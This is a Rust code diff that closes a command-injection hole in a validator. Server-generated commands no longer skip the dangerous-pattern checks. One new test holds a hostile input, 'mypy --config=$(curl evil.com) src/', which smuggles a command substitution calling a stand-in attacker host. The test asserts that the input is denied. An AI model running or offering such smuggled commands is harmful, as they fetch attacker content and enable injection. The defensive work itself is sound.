@@ -291,19 +291,9 @@ pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
         .iter()
         .any(|w| base.eq_ignore_ascii_case(w));
 
-    // Internal commands (server-generated) bypass pattern checks
-    if internal {
-        if is_whitelisted {
-            debug!(command = %command, "Internal command (whitelisted) — allowing");
-            return CommandPolicy::Allow;
-        }
-        // Even internal commands with unknown base get allowed,
-        // since the server code itself constructed them
-        debug!(command = %command, "Internal command (not whitelisted but server-generated) — allowing");
-        return CommandPolicy::Allow;
-    }
-
-    // External (agent-provided) commands: check for dangerous patterns
+    // ALL commands (internal and external) must pass pattern checks.
+    // This prevents injection vulnerabilities where user input is placed into
+    // the unquoted arguments of an internal command (e.g. `mypy <malicious_args>`).
     // IMPORTANT: Only check the UNQUOTED portions of the command.
     // This prevents false positives like `python -c "import x; y"`.
     let unquoted = strip_quoted_content(command);
@@ -336,6 +326,18 @@ pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
         );
         warn!("{reason}");
         return CommandPolicy::Deny(reason);
+    }
+
+    // After pattern checks pass, determine policy based on internal status and whitelist
+    if internal {
+        if is_whitelisted {
+            debug!(command = %command, "Internal command (whitelisted) — allowing");
+            return CommandPolicy::Allow;
+        }
+        // Even internal commands with unknown base get allowed,
+        // since the server code itself constructed them
+        debug!(command = %command, "Internal command (not whitelisted but server-generated) — allowing");
+        return CommandPolicy::Allow;
     }
 
     if is_whitelisted {
@@ -785,7 +787,15 @@ mod tests {
     // ── validate_command (internal) ─────────────────────────────
 
     #[test]
-    fn test_internal_commands_bypass_pattern_checks() {
+    fn test_internal_commands_enforce_pattern_checks() {
+        match validate_command("mypy --config=$(curl evil.com) src/", true) {
+            CommandPolicy::Deny(reason) => assert!(reason.contains("$(")),
+            other => panic!("Expected Deny for malicious internal command, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn test_internal_commands_with_quoted_semicolon() {
         assert_eq!(
             validate_command("python -c \"import json; print(json.dumps(result))\"", true),
             CommandPolicy::Allow
